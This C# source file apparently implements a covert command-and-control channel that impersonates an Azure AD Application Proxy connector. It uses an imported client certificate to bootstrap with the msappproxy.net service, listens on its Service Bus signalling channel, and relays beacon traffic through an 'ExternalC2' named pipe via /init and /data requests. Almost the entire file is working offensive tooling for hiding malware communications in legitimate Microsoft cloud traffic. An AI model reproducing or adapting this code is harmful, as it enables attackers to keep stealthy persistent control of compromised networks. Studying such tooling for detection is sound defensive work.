using Microsoft.ApplicationProxy.Common.BootstrapDataModel;
using Microsoft.ApplicationProxy.Common.SignalingDataModel;
using Microsoft.ApplicationProxy.Common.ProxyDataModel;
using Microsoft.ServiceBus;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography.X509Certificates;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Description;
using System.ServiceModel.Web;
using System.Threading.Tasks;
using System.Text;
using System.Threading;

namespace C2Bus
{
    [ServiceBehavior(InstanceContextMode = InstanceContextMode.Single, ConcurrencyMode = ConcurrencyMode.Multiple, Namespace = "Microsoft.ApplicationProxy.Connector.Listener")]
    public class ConnectorSignalingService : IConnectorSignalingService
    {
        private const string SessionIDHeader = "x-cwap-sessionid";
        private const string CertificateAuthenticationHeader = "x-cwap-certificate-authentication";
        private const string DnsCacheLookupHeader = "x-cwap-dnscachelookup-result";
        private const string ConnectorHeader = "x-cwap-connector-version";
        private const string DataModelHeader = "x-cwap-datamodel-version";
        private const string ConnectorSPHeader = "x-cwap-connector-sp-connections";
        private const string TransactionIDHeader = "x-cwap-transid";
        private const string UseDefaultProxyHeader = "x-cwap-connector-usesdefaultproxy";
        private const string HeadersSizeHeader = "x-cwap-headers-size";
        private const string ConnectorLatencyHeader = "x-cwap-connector-be-latency-ms";
        private const string PayloadAttemptsHeader = "x-cwap-payload-total-attempts";
        private const string ConnectorLoadFactoryHeader = "x-cwap-connector-loadfactor";
        private const string ReponseAttemptsHeader = "x-cwap-response-total-attempts";
        private const string ConnectorAllLatencyHeader = "x-cwap-connector-all-latency-ms";

        private const string CertificateAuthenticationValue = "notProcessed";
        private const string DnsCacheLookupValue = "notUsed";
        private const string ConnectorValue = "1.5.1975.0";
        private const string DataModelValue = "1.5.1970.0";
        private const string ConnectorSPValue = "10";
        private const string UseDefaultProxyValue = "notInitialized";
        private const string ConnectorLatencyValue = "51";
        private const string PayloadAttemptsValue = "0";
        private const string ConnectorLoadFactoryValue = "0";
        private const string ResponseAttemptsValue = "1";
        private const string ConnectorAllLatencyValue = "550";

        private const string SubscriberAdminURL = "https://{0}/subscriber/admin?requestId={1}";
        private const string SubscriberConnection = "https://{0}/subscriber/connection?requestId={1}";
        private const string PayloadRequestURL = "https://{0}/subscriber/payload?requestId={1}";
        private const string EC2PipeName = "test";

        private ExternalC2 externalC2;

        private string HandleIncomingRequest(string URL, Dictionary<string, string> headers, string verb, byte[] payload)
        {
            Uri parsedURL;

            Uri.TryCreate(URL, UriKind.Absolute, out parsedURL);
            if (parsedURL.AbsoluteUri.EndsWith("/init"))
            {
                var data = Convert.FromBase64String(ASCIIEncoding.ASCII.GetString(payload));
                externalC2 = new ExternalC2(data, EC2PipeName);
                externalC2.Start();
                return Convert.ToBase64String(externalC2.RecvDataFromBeacon());
            }
            else if (parsedURL.AbsoluteUri.EndsWith("/data"))
            {
                var data = Convert.FromBase64String(ASCIIEncoding.ASCII.GetString(payload));
                externalC2.SendDataToBeacon(data);
                return Convert.ToBase64String(externalC2.RecvDataFromBeacon());
            }

            return Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("NOPE"));
        }

        public Task<SignalResult> SignalConnectorAsync(SignalMessage message)
        {
            Task.Run(() =>
            {
                byte[] payload = new byte[0];
                string result = "";
                HttpWebResponse response = null;

                if (message.TunnelContext.HasPayload)
                {
                    HttpWebRequest payloadRequest = (HttpWebRequest)WebRequest.CreateHttp(String.Format(PayloadRequestURL, message.OverridenReturnHost, message.RequestId.ToString()));
                    payloadRequest.Headers[SessionIDHeader] = message.SessionId.ToString();
                    payloadRequest.Headers[CertificateAuthenticationHeader] = CertificateAuthenticationValue;
                    payloadRequest.Headers[DnsCacheLookupHeader] = DnsCacheLookupValue;
                    payloadRequest.Headers[ConnectorHeader] = ConnectorValue;
                    payloadRequest.Headers[DataModelHeader] = DataModelValue;
                    payloadRequest.Headers[ConnectorSPHeader] = ConnectorSPValue;
                    payloadRequest.Headers[TransactionIDHeader] = message.TransactionId.ToString();
                    payloadRequest.Headers[UseDefaultProxyHeader] = UseDefaultProxyValue;
                    payloadRequest.AllowWriteStreamBuffering = false;
                    payloadRequest.ClientCertificates.Add(C2Bus.AppProxyC2.clientCert);

                    try
                    {
                        HttpWebResponse payloadResponse = (HttpWebResponse)payloadRequest.GetResponseWithFailureRetry();
                        using (Stream responseStream = payloadResponse.GetResponseStream())
                        {
                            using (MemoryStream ms = new MemoryStream())
                            {
                                responseStream.CopyTo(ms);
                                payload = ms.ToArray();
                            }
                        }
                    }
                    catch (System.Exception e)
                    {
                        Console.WriteLine("[!] Error receiving POST data: {0}", e.Message);
                        return;
                    }
                }

                HttpContext httpContext = (HttpContext)message.TunnelContext.ProtocolContext;

                HttpWebRequest request = (HttpWebRequest)WebRequest.CreateHttp(String.Format(SubscriberAdminURL, message.OverridenReturnHost, message.RequestId.ToString()));
                request.Headers[SessionIDHeader] = message.SessionId.ToString();
                request.Headers[CertificateAuthenticationHeader] = CertificateAuthenticationValue;
                request.Headers[DnsCacheLookupHeader] = DnsCacheLookupValue;
                request.Headers[ConnectorHeader] = ConnectorValue;
                request.Headers[DataModelHeader] = DataModelValue;
                request.Headers[ConnectorSPHeader] = ConnectorSPValue;
                request.Headers[TransactionIDHeader] = message.TransactionId.ToString();
                request.Headers[UseDefaultProxyHeader] = UseDefaultProxyValue;
                request.AllowWriteStreamBuffering = false;
                request.ClientCertificates.Add(C2Bus.AppProxyC2.clientCert);

                try
                {
                    response = (HttpWebResponse)request.GetResponseWithFailureRetry();

                    using (Stream responseStream = response.GetResponseStream())
                    {
                        using (StreamReader streamReader = new StreamReader(responseStream))
                        {
                            result = streamReader.ReadToEnd();
                        }
                    }
                }
                catch (System.Exception e)
                {
                    Console.WriteLine("[!] Error receiving /subscriber/admin data: {0}", e.Message);
                    return;
                }

                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(SubscriptionConfiguration), new DataContractJsonSerializerSettings
                {
                    UseSimpleDictionaryFormat = true
                });

                using (MemoryStream ms = new MemoryStream(ASCIIEncoding.ASCII.GetBytes(result)))
                {
                    SubscriptionConfiguration configuration = (SubscriptionConfiguration)serializer.ReadObject(ms);
                }

                var beaconResponse = this.HandleIncomingRequest(httpContext.RequestUrl, httpContext.Headers, httpContext.RequestVerb, payload.ToArray());

                var originalHeaders = string.Format("HTTP/1.1 200 OK\r\nDate: {0} GMT\r\nContent-Length: {1}\r\nContent-Type: text/html\r\nServer: Microsoft-IIS/10.0\r\n\r\n", DateTime.Now.ToUniversalTime().ToString("r"), beaconResponse.Length);

                // Send the response
                request = (HttpWebRequest)WebRequest.CreateHttp(String.Format(SubscriberConnection, message.OverridenReturnHost, Guid.NewGuid()));
                request.Headers[SessionIDHeader] = message.SessionId.ToString();
                request.Headers[CertificateAuthenticationHeader] = CertificateAuthenticationValue;
                request.Headers[DnsCacheLookupHeader] = DnsCacheLookupValue;
                request.Headers[ConnectorHeader] = ConnectorValue;
                request.Headers[DataModelHeader] = DataModelValue;
                request.Headers[ConnectorSPHeader] = ConnectorSPValue;
                request.Headers[TransactionIDHeader] = message.TransactionId.ToString();
                request.Headers[UseDefaultProxyHeader] = UseDefaultProxyValue;
                request.Headers[HeadersSizeHeader] = (originalHeaders.Length).ToString();
                request.Headers[ConnectorLatencyHeader] = ConnectorLatencyValue;
                request.Headers[PayloadAttemptsHeader] = PayloadAttemptsValue;
                request.Headers[ConnectorLoadFactoryHeader] = ConnectorLoadFactoryValue;
                request.Headers[ReponseAttemptsHeader] = ResponseAttemptsValue;
                request.Headers[ConnectorAllLatencyHeader] = ConnectorAllLatencyValue;

                request.AllowWriteStreamBuffering = false;
                request.ClientCertificates.Add(C2Bus.AppProxyC2.clientCert);
                request.Method = "POST";
                request.SendChunked = true;

                var concatBytes = ASCIIEncoding.ASCII.GetBytes(originalHeaders).Concat(ASCIIEncoding.ASCII.GetBytes(beaconResponse)).ToArray();

                using (Stream writer = request.GetRequestStream())
                {
                    writer.Write(concatBytes, 0, concatBytes.Length);
                }

                try
                {
                    response = (HttpWebResponse)request.GetResponseWithFailureRetry();
                }
                catch (System.Exception e)
                {
                    Console.WriteLine("[!] Error responding to data: {0}", e.Message);
                    return;
                }
            });

            return Task.FromResult<SignalResult>(new SignalResult(1, AppProxyC2.ConnectorId));
        }
    }

    internal class AppProxyC2
    {
        public static X509Certificate2 clientCert;
        public static Guid ConnectorId;
        public static Guid SubscriptionId;

        private const int RetryCount = 20;
        private const string LastNETVersion = "461814";
        private const string MachineName = "poc.lab.local";
        private const string OSLanguage = "1033";
        private const string OSLocale = "0409";
        private const string OSSKU = "79";
        private const string OSVersion = "10.0.17763";
        private const string SDKVersion = "1.5.1975.0";

        private const string BootstrapURL = "https://{0}.bootstrap.msappproxy.net";

        public AppProxyC2(string clientCertFilename, string clientCertPassword, Guid subscriptionId, Guid connectorId)
        {
            AppProxyC2.SubscriptionId = subscriptionId;
            AppProxyC2.ConnectorId = connectorId;

            AppProxyC2.clientCert = new X509Certificate2();
            AppProxyC2.clientCert.Import(clientCertFilename, clientCertPassword, X509KeyStorageFlags.Exportable);
        }

        public AppProxyC2(byte[] clientCert, string clientCertPassword, Guid subscriptionId, Guid connectorId)
        {
            AppProxyC2.SubscriptionId = subscriptionId;
            AppProxyC2.ConnectorId = connectorId;

            AppProxyC2.clientCert = new X509Certificate2();
            AppProxyC2.clientCert.Import(clientCert, clientCertPassword, X509KeyStorageFlags.Exportable);
        }

        public void Start()
        {
            // Needed, otherwise the connection fails
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;

            // Service Bus needs to use HTTPS rather than TCP
            ServiceBusEnvironment.SystemConnectivity.Mode = Microsoft.ServiceBus.ConnectivityMode.Https;

            var bootstrapResponse = this.SendBootstrap(true);

            foreach (var response in bootstrapResponse.SignalingListenerEndpoints)
            {
                var endpointSettings = response as ServiceBusSignalingListenerEndpointSettings;

                if (endpointSettings != null)
                {
                    this.StartSignallingWorker(endpointSettings);
                }
            }

            // We need to re-bootstrap periodically to keep the channel open
            while (true)
            {
                Console.WriteLine("[*] Sleeping main thread, bootstrap before {0} milliseconds", bootstrapResponse.PeriodicBootstrapIntervalMilliseconds);
                Thread.Sleep(bootstrapResponse.PeriodicBootstrapIntervalMilliseconds);
                bootstrapResponse = this.SendBootstrap();
            }
        }

        private BootstrapResponse SendBootstrap(bool isInitial = false)
        {
            Uri serviceEndpoint;

            if (!Uri.TryCreate(String.Format(BootstrapURL, SubscriptionId), UriKind.Absolute, out serviceEndpoint))
            {
                throw new BootstrapException(String.Format("Could not parse provided URI: {0}", String.Format(BootstrapURL, SubscriptionId)));
            }

            var serviceChannel = new WebChannelFactory<IBootstrapService>(new WebHttpBinding
            {
                Security =  {
                    Mode = WebHttpSecurityMode.Transport,
                    Transport = {
                            ClientCredentialType = HttpClientCredentialType.Certificate
                        }
                    }
            }, serviceEndpoint)
            {
                Credentials = {
                      ClientCertificate = {
                        Certificate = clientCert
                    }
                }
            };

            Guid requestId = Guid.NewGuid();

            BootstrapRequest request = new BootstrapRequest
            {
                InitialBootstrap = isInitial,
                ConsecutiveFailures = 0,
                RequestId = requestId,
                SubscriptionId = SubscriptionId,
                ConnectorId = ConnectorId,
                AgentVersion = SDKVersion,
                AgentSdkVersion = SDKVersion,
                ProxyDataModelVersion = SDKVersion,
                BootstrapDataModelVersion = SDKVersion,
                MachineName = MachineName,
                OperatingSystemVersion = OSVersion,
                OperatingSystemSKU = OSSKU,
                OperatingSystemLanguage = OSLanguage,
                OperatingSystemLocale = OSLocale,
                UseSpnegoAuthentication = false,
                UseServiceBusTcpConnectivityMode = false,
                IsProxyPortResponseFallbackDisabledFromRegistry = true,
                CurrentProxyPortResponseMode = "Primary",
                UpdaterStatus = "Stopped",
                LatestDotNetVersionInstalled = LastNETVersion,
                PerformanceMetrics = new ConnectorPerformanceMetrics(new List<AggregatedCpuData>(), 0, 0, 0, 0),
            };

            var bootstrapService = serviceChannel.CreateChannel();
            Task<BootstrapResponse> resp = null;
            BootstrapResponse result = null;

            for (int i = 0; i < RetryCount; i++)
            {
                try
                {
                    resp = bootstrapService.ConnectorBootstrapAsync(request);
                    result = resp.GetAwaiter().GetResult();
                    break;
                }
                catch (Exception e)
                {
                    Thread.Sleep(5000);
                }
            }

            return result;
        }

        private void StartSignallingWorker(ServiceBusSignalingListenerEndpointSettings signallingEndpointSettings)
        {
            Uri signallingURI;
            ServiceHost host;
            ServiceEndpoint endpoint;
            TokenProvider tokenProvider;
            TransportClientEndpointBehavior transportClientEndpointBehavior;

            string address = string.Format("{0}://{1}.{2}/{3}",
                signallingEndpointSettings.Scheme,
                signallingEndpointSettings.Namespace,
                signallingEndpointSettings.Domain,
                signallingEndpointSettings.ServicePath
            );

            if (!Uri.TryCreate(address, UriKind.Absolute, out signallingURI))
            {
                throw new BootstrapException(String.Format("Could not parse provided signalling URI: {0}", address));
            }

            Binding binding = new NetTcpRelayBinding
            {
                IsDynamic = false,
                HostNameComparisonMode = HostNameComparisonMode.Exact
            };

            ConnectionStatusBehavior statusBehavior = new ConnectionStatusBehavior();
            statusBehavior.Online += delegate (object o, EventArgs e)
            {
                Console.WriteLine("[:)] Listener for is now online.");
            };

            host = new ServiceHost(typeof(ConnectorSignalingService), signallingURI);
            tokenProvider = TokenProvider.CreateSharedAccessSignatureTokenProvider(signallingEndpointSettings.SharedAccessKeyName, signallingEndpointSettings.SharedAccessKey);
            endpoint = host.AddServiceEndpoint(typeof(IConnectorSignalingService), binding, address);
            transportClientEndpointBehavior = new TransportClientEndpointBehavior(tokenProvider);

            endpoint.EndpointBehaviors.Add(statusBehavior);
            endpoint.EndpointBehaviors.Add(transportClientEndpointBehavior);

            host.Open();
        }
    }

    internal class BootstrapException : Exception
    {
        public BootstrapException(string message)
            : base(message)
        {
        }
    }
}